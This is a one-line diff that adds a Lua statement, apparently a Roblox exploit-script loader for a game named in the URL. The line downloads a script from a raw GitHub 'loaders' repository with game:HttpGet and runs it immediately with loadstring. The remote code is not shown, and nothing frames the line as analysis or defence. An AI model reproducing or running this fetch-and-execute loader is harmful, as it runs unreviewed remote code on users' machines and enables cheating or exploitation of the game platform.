@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/space-roll-the-world-spam7-r3y0ivpqo3gxuz.lua"))()
